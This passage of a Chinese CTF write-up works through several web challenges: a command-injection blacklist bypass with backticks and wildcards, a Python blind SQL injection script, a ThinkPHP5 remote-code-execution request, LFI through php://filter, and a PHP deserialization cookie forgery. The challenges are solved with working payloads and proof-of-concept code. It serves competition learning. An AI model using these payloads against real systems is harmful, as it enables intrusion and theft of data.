<p>成功执行phpinfo，看看有没有disable_functions的限制</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028211017-49791eba-f984-1.png"/></p>
<p>没有限制</p>
<p>8.接下来就是读<strong>flag.php</strong>文件，选用一个最短的<strong>readfile</strong>函数</p>
<pre><code>?content=?content=&lt;search&gt;{i{haha:type}&lt;/search&gt;&amp;searchnum={end%20if}&amp;type=f:readfile('flag.php')}</code></pre>
<p>但是，这样<strong>type</strong>参数长度还是超过了20，这时候，想到还有最后一个参数<strong>typename</strong>没有利用到，于是，传入：</p>
<pre><code>?content=&lt;search&gt;{i{haha:type}&lt;/search&gt;&amp;searchnum={end%20if}&amp;type=f:rea{haha:typename}&amp;typename=dfile(%27flag.php%27)}</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028211101-6372b07e-f984-1.png"/></p>
<h3 data-content="1" id="38fc154fa6c12c0a5cc9805000eeb245">8.bypass（800 points）</h3>
<p>考点：rce，正则匹配特点，文件通配符，命令换行，命令注释</p>
<p>1.源码：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028211245-a1cb3436-f984-1.jpg"/></p>
<p>命令执行bypass，过滤点有两处</p>
<p>（1）正则匹配的黑名单：</p>
<pre><code>if (preg_match("/\'|\"|,|;|\\|\`|\*|\n|\t|\xA0|\r|\{|\}|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is", $a))
        $a = "";</code></pre>
<p>（2）对输入参数强制包裹双引号""：</p>
<pre><code>$a ='"' . $a . '"';</code></pre>
<p>其实最致命的是第二处过滤，强制添加双引号，即使我们输入了黑名单里没有的命令，在双引号的作用下，也执行不了命令</p>
<p>所以，这时候就想到了，强制命令执行的<strong>反引号`</strong></p>
<p>2.但是，这里好像正则过滤了？其实没有，不信，我们测试一下：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028211449-eb5d7528-f984-1.png"/></p>
<p>很惊奇的发现，由于前面存在的：</p>
<pre><code>\\|</code></pre>
<p>会将<code>|</code>进行转义，这是因为在<strong>preg_match</strong>中，三个反斜杠<code>\\\</code>才能匹配一个真正意义上的字符反斜杠<code>\</code>，所以这里因为正则的匹配机制造成了<strong>反引号逃逸</strong></p>
<p>3.执行命令：</p>
<pre><code>?a=`uname`</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028211535-06fb6f1a-f985-1.png"/></p>
<p>果然成功执行<strong>uname</strong>，那么接下来，就是想办法列目录了，虽然这里<strong>ls</strong>被禁用了，但是我们还可以用<strong>dir</strong></p>
<pre><code>?a=`dir /`</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028211609-1b79e6a6-f985-1.png"/></p>
<p>4.但是没有发现flag文件，试着找了其他常见目录下，也未发现，那么，就试着执行查找文件名操作：<strong>find</strong></p>
<p>虽然<strong>find</strong>在黑名单中，但是，我们可以通过执行<strong>二进制文件</strong>和<strong>通配符</strong><code>?</code>的结合来进行绕过</p>
<p>payload：</p>
<pre><code>?a=`/usr/b??/???d / -name ?lag`</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028211820-69850dda-f985-1.png"/></p>
<p>但是还是未找到flag文件，再试着<strong>grep -R</strong>来搜索flag内容<strong>ctf</strong>，payload:</p>
<pre><code>?a=`/?in/gre?%20-R%20ctf`</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028211923-8eb968bc-f985-1.png"/></p>
<p>发现flag</p>
<p>5.不过这是非预期解，后面出题人把<code>\\</code>位置换到<code>\^</code>的前面，预期解是：</p>
<pre><code>?a=\&amp;b=%0a/???/gr?p%20-R%20ctf%20%23</code></pre>
<p>实质上还是因为正则<code>\\</code>匹配不到<code>\</code>的问题，使用了换行<code>%0a</code>，再结合linux的<strong>命令终止符</strong><code>%20#</code>处理双引号，最终的命令为：</p>
<pre><code>file "\" "
/???/gr?p -R ctf #"</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028212138-df25a7b6-f985-1.png"/></p>
<h3 data-content="1" id="a7f490dd9b3241ee52036783fb8aa3e4">9.easy_admin（1000 points）</h3>
<p>考点：sql注入，HTTP头部修改</p>
<p>解题步骤：</p>
<p>1.打开靶机，是一个登陆界面</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028212221-f90b6bc0-f985-1.png"/></p>
<p>2.扫描目录，发现存在<strong>admin.php</strong></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028212244-06fd4000-f986-1.png"/></p>
<p>3.另外还有个<strong>forget.php</strong></p>
<p>思路就应该是要登陆admin，在<strong>forget.php</strong>中发现<strong>username</strong>存在注入点，用户名不存在时会返回no this user，利用这个点进行布尔盲注</p>
<p>fuzz发现过滤了<strong>or</strong>，<strong>and</strong>，<strong>select</strong>等关键字，用<strong>&amp;&amp;</strong>来代替<strong>and</strong>即可，盲注脚本如下：</p>
<pre><code>import requests

url = "http://101.71.29.5:10045/index.php?file=forget"
password = ""
for i in range(1,50):
    for j in range(44,128):
        data= {
            "username":"admin' &amp;&amp; ascii(substr(password,%d,1))=%d#"%(i,j)
        }
        r = requests.post(url,data=data)
        if "no this user" not in r.text:
            password = password + chr(j)
            print password</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028212401-34ade3f6-f986-1.png"/></p>
<p>4.跑出admin的密码：<strong>flag{never_too</strong></p>
<p>然后登陆admin</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028212435-49024f0e-f986-1.png"/></p>
<p>提示我们：admin will access the website from，于是加个头部字段：</p>
<pre><code>Referer:127.0.0.1</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028212516-61136d1c-f986-1.png"/></p>
<p>拿到另一半flag</p>
<p>最后的flag就是：flag{never_too_late_to_x}</p>
<h3 data-content="1" id="565acd3dd380d9e1d51405cd3eacb729">10.easy_pentest（1000 points）</h3>
<p>考点：tp框架特性，信息泄露，rce</p>
<p>解题步骤：</p>
<p>1.考点即题目的两个hint：</p>
<pre><code>Hint1:tp框架特性 
Hint2:万物皆有其根本，3.x版本有，5.x也有，严格来说只能算信息泄露</code></pre>
<p>2.测试发现，我们输入index.php等已知的tp文件，都会自动跳转回<strong>not_safe.html</strong>，我们首先要找到泄露信息的点，获得权限去访问</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028212603-7d7fe34a-f986-1.png"/></p>
<p>3.信息泄露，就想到了去查看tp日志</p>
<p>通过fuzz，发现<strong>runtime/log/201910/02.log</strong>存在信息泄露</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028212637-916c68e2-f986-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028212654-9bef33da-f986-1.png"/></p>
<p>4.发现一个关键的参数<strong>safe_key</strong>，然后根据上面写的头部再次访问</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028212737-b56955f2-f986-1.png"/></p>
<p>访问成功，跳转到了<strong>safe_page.html</strong>，并获取到了tp版本为<strong>5</strong></p>
<p>5.接下来，就是去找tp5是否存在已知爆出的远程rce的漏洞，参考：<a href="https://mochazz.github.io/2019/04/09/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C10/#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%A6%81" target="_blank">ThinkPHP5漏洞分析之代码执行(十)</a></p>
<p>6.漏洞点是tp5的<strong>method</strong>代码执行，漏洞触发点在<strong>call_user_func</strong>函数</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028212845-ddb55470-f986-1.png"/></p>
<p>7.直接拿payload打过去</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028212927-f71114ea-f986-1.png"/></p>
<p>8.成功执行，后面测试发现过滤了如下内容：</p>
<pre><code>file关键字

php短标签：
&lt;?php
&lt;?
&lt;?=

php伪协议：
php://filter

disable_functions:system,shell_exec,exec,proc_open,passthru等命令执行函数</code></pre>
<p>9.另外php版本是<strong>7.1</strong>，也就是说assert不能动态调用了，而<strong>eval</strong>在php手册中已经写道：是一个<strong>language construct</strong>，而不是一个函数，所以也不能通过<strong>call_user_func</strong>来调用</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028213016-141f5402-f987-1.png"/></p>
<p>10.我们能利用的就只有读取文件<strong>show_source</strong>和扫描目录<strong>scandir</strong>，show_source可以很轻松的读到<strong>/etc/passwd</strong>，但是不知道flag文件路径，而<strong>scandir</strong>会因为是返回数组而无法输出</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028213108-3333375a-f987-1.png"/></p>
<p>11.所以得想办法，输出scandir，参考：<a href="https://xz.aliyun.com/t/6106#toc-4?tdsourcetag=s_pcqq_aiomsg" target="_blank">记一次有趣的tp5代码执行</a>，里面提到<strong>filter</strong>可以通过传递多个来对参数进行多次的处理</p>
<p>12.所以，可以先传入<strong>filter[]=scandir&amp;get[]=/</strong>，这样读取完目录后。传入<strong>filter[]=var_dump</strong>，就可以成功输出扫描目录结果了</p>
<p>13.payload：</p>
<pre><code>POST /public/index.php?safe_key=easy_pentesnt_is_s0fun HTTP/1.1
Host: 101.71.29.5:10021
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0
x-requested-with: XMLHttpRequest
Accept: application/json, text/javascript, */*; q=0.01
Cookie: thinkphp_show_page_trace=0|0; hibext_instdsigdipv2=1
Referer: http://101.71.29.5:10021/public/index.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Connection: close
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 84

_method=__construct&amp;method=get&amp;server[]=1&amp;filter[]=scandir&amp;get[]=/&amp;filter[]=var_dump</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028213240-69f30518-f987-1.png"/></p>
<p>14.flag文件在<strong>/home</strong>目录下</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028213318-8051ba98-f987-1.png"/></p>
<p>15.最后读取flag</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028213342-8ec47f5c-f987-1.png"/></p>
<h3 data-content="1" id="c0d3fd8db515397213e42b26918449fb">11.K&amp;K战队的老家（1000 points）</h3>
<p>考点：万能密码，LFI，代码审计，反序列化</p>
<p>解题步骤：</p>
<p>1.打开靶机，是一个登陆界面</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028213408-9e2c0528-f987-1.png"/></p>
<p>2.用万能密码即可登陆：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028213426-a96254e2-f987-1.png"/></p>
<p>3.登陆后，给了我们一串看不懂的cookie：</p>
<pre><code>%26144%2616a%2615f%26123%2613f%26159%2613a%2616a%2614a%26148%2613e%2616a%26151%26147%26129%26165%26139%2615a%2615f%2616a%2613f%2615e%26164%2616a%2613f%2615a%26149%26126%26139%2615d%2613e%2615f%26152%26122%26129%2616a%2614a%26143%26139%26127%26151%26144%2615f%26168%2613f%26123%2613d%26126%2613d%2615a%2615f%26159%26151%26147%26141%26159%2613f%26122%2615b%26126%2613d%26144%26164%2616a%2613f%2615a%26157%26126%26139%2615e%26146%2616a%2614a%26148%2613a%26165%26149%26147%26121%2615c%26139%2615a%26164%2616a%2613f%2615a%26153%26126%26139%2615e%26146%26165%26149%26147%26142%26164%26151%26147%26124%26159%2613f%26123%26120%2612d</code></pre>
<p>4.然后来到后台，源码中发现有个<strong>debug</strong>功能，并且<strong>m</strong>参数疑似存在<strong>LFI</strong></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028213519-c86fa1e6-f987-1.png"/></p>
<p>5.访问<strong>debug</strong></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028213546-d917fc3c-f987-1.png"/></p>
<p>6.提示cookie出错，猜想可能需要伪造一个正确的cookie，才能使用debug功能，那么就需要获取源码</p>
<p>7.m参数过滤了关键字<strong>php</strong>和<strong>base64</strong>，尝试大小写，发现可以绕过，读取源码：</p>
<pre><code>?m=PHP://filter/convert.Base64-encode/resource=home</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028213613-e8cb256e-f987-1.png"/></p>
<p>8.拿到源码后，审计发现，在<strong>debug.php</strong>的魔术方法<strong>__toString</strong>中，存在包含<strong>flag.php</strong>文件的操作，那么这就是我们最后要执行的地方</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028213700-051cf904-f988-1.png"/></p>
<p>9.触发<strong>__toString</strong>魔术方法的条件就是把类当作字符串输出，对应<strong>debug.php</strong>的<strong>debug</strong>方法的末尾方法</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028213746-2030a0ce-f988-1.png"/></p>
<p>要触发<strong>debug</strong>方法，就在<strong>home.php</strong>末尾代码：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028213808-2d61b2a6-f988-1.png"/></p>
<p>10.但是中间有许多waf需要我们bypass</p>
<p>（1）check函数：<code>check($cookie, $db, $session);</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028213836-3dfa7f80-f988-1.png"/></p>
<p>此处存在反序列点，而且<strong>$objstr</strong>对应cookie的<strong>identity</strong>字段，没用过滤，是可控的，我们可以进行任意的反序列化操作</p>
<p>这里只需要没反序列化正确，就能通过</p>
<p>（2）index_check函数：<strong>index_check($session-&gt;id, $session-&gt;username);</strong></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028213911-53128430-f988-1.png"/></p>
<p>返回结果数量不能小于4，即我们反序列化后对象的username和id字段拼接道Sql语句后必须有查询结果</p>
<p>（3）debug类的<strong>__construct</strong>魔术方法，<strong>check1</strong>函数</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028214002-716eeebe-f988-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028214015-78f355bc-f988-1.png"/></p>
<p>检查对象的username字段是否为<strong>debuger</strong>，意思是我们查询的用户名必须是<strong>debuger</strong>，<strong>check1</strong>函数同理</p>
<p>（4）最后输出<code>echo $this-&gt;forbidden</code>;</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028214039-874c8c1e-f988-1.png"/></p>
<p>虽然前后矛盾，但是细看，第一个比较是<code>===</code>，而第二个比较<strong>switch</strong>则是弱类型比较即<code>==</code>，所以我们可以让<strong>$this-&gt;choose</strong>为"<strong>2</strong>"，即可绕过过滤</p>
<p>11.综上，写出如下POC：</p>
<pre><code>&lt;?php

function cookie_encode($str) {
    $key = base64_encode($str);
    $key = bin2hex($key);
    $arr = str_split($key, 2);
    $cipher = '';
    foreach($arr as $value) {
        $num = hexdec($value);
        $num = $num + 240;
        $cipher = $cipher.'&amp;'.dechex($num);
    }
    return $cipher;
}

class session{
    public $choose = 1;
    public $id = 0;
    public $username = "";
}

class debug
{
    public $choose = "2";
    public $forbidden = "";
    public $access_token = "";
    public $ob = NULL;
    public $id = 2;
    public $username = "debuger";

    public function __construct()
    {
        $this-&gt;forbidden = unserialize('O:5:"debug":4:{s:6:"choose";s:1:"2";s:9:"forbidden";s:0:"";s:12:"access_token";s:0:"";s:2:"ob";N;}');
    }
}

$d = new debug();
//echo serialize($d);
echo cookie_encode(serialize($d));

?&gt;</code></pre>
<p>12.运行得到cookie的payload：</p>
<pre><code>&amp;144&amp;16a&amp;15f&amp;121&amp;13f&amp;159&amp;13a&amp;15b&amp;14a&amp;147&amp;13a&amp;121&amp;14a&amp;169&amp;139&amp;126&amp;13e&amp;15a&amp;160&amp;127&amp;153&amp;16a&amp;15f&amp;122&amp;13f&amp;159&amp;13a&amp;15a&amp;151&amp;137&amp;129&amp;166&amp;153&amp;122&amp;145&amp;159&amp;13f&amp;123&amp;13d&amp;126&amp;13d&amp;144&amp;15f&amp;159&amp;13d&amp;159&amp;139&amp;127&amp;153&amp;16a&amp;15f&amp;125&amp;13f&amp;159&amp;13a&amp;15d&amp;152&amp;123&amp;13a&amp;159&amp;151&amp;147&amp;142&amp;15b&amp;14a&amp;147&amp;124&amp;159&amp;13f&amp;120&amp;128&amp;126&amp;13e&amp;144&amp;15f&amp;159&amp;14a&amp;137&amp;146&amp;159&amp;154&amp;147&amp;153&amp;159&amp;13f&amp;15a&amp;149&amp;126&amp;155&amp;123&amp;13d&amp;126&amp;13e&amp;15a&amp;15f&amp;159&amp;149&amp;122&amp;158&amp;166&amp;152&amp;123&amp;13e&amp;15c&amp;139&amp;15a&amp;164&amp;16a&amp;13f&amp;15a&amp;135&amp;126&amp;139&amp;15a&amp;139&amp;159&amp;13f&amp;123&amp;13d&amp;126&amp;13f&amp;144&amp;15f&amp;159&amp;14a&amp;15d&amp;129&amp;169&amp;149&amp;15d&amp;15c&amp;15b&amp;14a&amp;137&amp;146&amp;165&amp;139&amp;15a&amp;164&amp;16a&amp;13f&amp;15a&amp;131&amp;126&amp;139&amp;159&amp;139&amp;127&amp;153&amp;16a&amp;15f&amp;168&amp;13d&amp;15a&amp;15f&amp;159&amp;149&amp;147&amp;13e&amp;15a&amp;14a&amp;148&amp;13e&amp;16a&amp;148&amp;123&amp;142&amp;166&amp;151&amp;122&amp;146&amp;165&amp;139&amp;15a&amp;164&amp;16a&amp;13f&amp;15a&amp;131&amp;126&amp;139&amp;159&amp;139&amp;127&amp;153&amp;16a&amp;15f&amp;169&amp;13f&amp;159&amp;13a&amp;166&amp;149&amp;159&amp;139&amp;127&amp;144&amp;15a&amp;164&amp;16a&amp;13f&amp;15a&amp;139&amp;126&amp;139&amp;15d&amp;15c&amp;15b&amp;139&amp;15a&amp;164&amp;160&amp;13f&amp;15a&amp;139&amp;127&amp;153&amp;16a&amp;15f&amp;124&amp;13f&amp;159&amp;13a&amp;121&amp;153&amp;122&amp;146&amp;169&amp;152&amp;15d&amp;136&amp;164&amp;14a&amp;143&amp;139&amp;127&amp;153&amp;16a&amp;15f&amp;123&amp;13f&amp;159&amp;13a&amp;15b&amp;14a&amp;147&amp;13a&amp;121&amp;14a&amp;122&amp;146&amp;169&amp;139&amp;15a&amp;164&amp;129&amp;153&amp;16a&amp;15f&amp;168&amp;13d&amp;15a&amp;15f&amp;159&amp;149&amp;147&amp;13e&amp;15a&amp;14a&amp;148&amp;13e&amp;16a&amp;148&amp;123&amp;142&amp;166&amp;151&amp;122&amp;146&amp;165&amp;139&amp;15a&amp;164&amp;16a&amp;13f&amp;15a&amp;131&amp;126&amp;139&amp;159&amp;139&amp;127&amp;153&amp;16a&amp;15f&amp;169&amp;13f&amp;159&amp;13a&amp;166&amp;149&amp;159&amp;139&amp;127&amp;144&amp;15a&amp;164&amp;16a&amp;13f&amp;15a&amp;139&amp;126&amp;139&amp;15d&amp;15c&amp;15b&amp;139&amp;15a&amp;164&amp;160&amp;13f&amp;15a&amp;139&amp;127&amp;153&amp;16a&amp;15f&amp;124&amp;13f&amp;159&amp;13a&amp;121&amp;153&amp;122&amp;146&amp;169&amp;152&amp;15d&amp;136&amp;164&amp;14a&amp;143&amp;139&amp;127&amp;153&amp;16a&amp;15f&amp;123&amp;13f&amp;159&amp;13a&amp;15b&amp;14a&amp;147&amp;13a&amp;121&amp;14a&amp;122&amp;146&amp;169&amp;139&amp;15a&amp;164&amp;129</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028214200-b7e5b8d2-f988-1.png"/></p>
<p>13.传入后发现，此时已经成功包含<strong>flag.php</strong>，但是，提示了一段信息：<strong>token error</strong>，并且告诉我们在flag.php中还包含了<strong>access.php</strong>猜想可能对应类中的<strong>access_token</strong>参数，但是因为是include，所以我们看不到flag.php的源码。这里也是卡了很久，后来才发现有备份文件：<strong>access.php.bak</strong></p>
<pre><code>&lt;?php
error_reporting(0);
$hack_token = '3ecReK&amp;key';
try {
    $d = unserialize($this-&gt;funny);
} catch(Exception $e) {
    echo '';
}
?&gt;</code></pre>
<p>14.那么，我们再添加一个参数<strong>$this-&gt;funny</strong>，反序列化后的<strong>access_token</strong>为<strong>3ecReK&amp;key</strong>即可</p>
<p>最终POC：</p>
<pre><code>&lt;?php

function cookie_encode($str) {
    $key = base64_encode($str);
    $key = bin2hex($key);
    $arr = str_split($key, 2);
    $cipher = '';
    foreach($arr as $value) {
        $num = hexdec($value);
        $num = $num + 240;
        $cipher = $cipher.'&amp;'.dechex($num);
    }
    return $cipher;
}

class session{
    public $choose = 1;
    public $id = 0;
    public $username = "";
}

class debug
{
    public $choose = "2";
    public $forbidden = "";
    public $access_token = "";
    public $ob = NULL;
    public $id = 2;
    public $username = "debuger";
    public $funny = 'O:5:"debug":4:{s:6:"choose";s:1:"2";s:9:"forbidden";s:0:"";s:12:"access_token";s:10:"3ecReK&amp;key";s:2:"ob";N;}';

    public function __construct()
    {
        $this-&gt;forbidden = unserialize('O:5:"debug":4:{s:6:"choose";s:1:"2";s:9:"forbidden";s:0:"";s:12:"access_token";s:0:"";s:2:"ob";N;}');
    }
}

$d = new debug();
//echo serialize($d);
echo cookie_encode(serialize($d));

?&gt;</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191028214249-d523c650-f988-1.png"/></p>
</div>
</div>